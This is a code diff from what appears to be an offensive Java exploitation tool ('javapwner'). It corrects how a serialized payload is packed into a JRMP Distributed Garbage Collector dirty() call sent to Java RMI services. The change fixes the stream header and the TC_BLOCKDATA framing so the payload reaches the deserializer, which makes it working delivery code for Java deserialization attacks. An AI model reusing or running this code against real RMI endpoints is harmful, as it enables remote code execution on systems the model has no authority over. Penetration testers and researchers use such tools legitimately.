@@ -30,9 +30,6 @@ from javapwner.protocols.rmi.protocol import (
     parse_lookup_return,
     DGC_OBJID,
     MSG_CALL,
-    JAVA_STREAM_MAGIC,
-    JAVA_STREAM_VERSION,
-    TC_ENDBLOCKDATA,
 )
 import struct as _struct
 
@@ -503,9 +500,25 @@ _DGC_OP_INDEX = _struct.pack(">i", 1)          # dirty() op index (old-style dis
 _DGC_INTERFACE_HASH = _struct.pack(">q", -669196253586618813)
 
 
+_OOS_HEADER = b"\xac\xed\x00\x05"
+
+
 def _build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
-    """Wrap *payload_bytes* in a JRMP DGC dirty() call."""
-    return bytes([MSG_CALL]) + DGC_OBJID + _DGC_OP_INDEX + _DGC_INTERFACE_HASH + payload_bytes
+    """Wrap *payload_bytes* in a JRMP DGC dirty() call.
+
+    Correct wire format: OOS header before ObjID, data in TC_BLOCKDATA.
+    The payload OOS header (AC ED 00 05) is stripped; only the raw object
+    content is embedded as the deserialised argument.
+    """
+    block_data = DGC_OBJID + _DGC_OP_INDEX + _DGC_INTERFACE_HASH  # 22+4+8 = 34 bytes
+    object_bytes = payload_bytes[4:] if payload_bytes[:2] == b"\xac\xed" else payload_bytes
+    return (
+        bytes([MSG_CALL])
+        + _OOS_HEADER
+        + bytes([0x77, len(block_data)])   # TC_BLOCKDATA, length=34
+        + block_data
+        + object_bytes
+    )
 
 
 def _build_hashmap_payload() -> bytes:
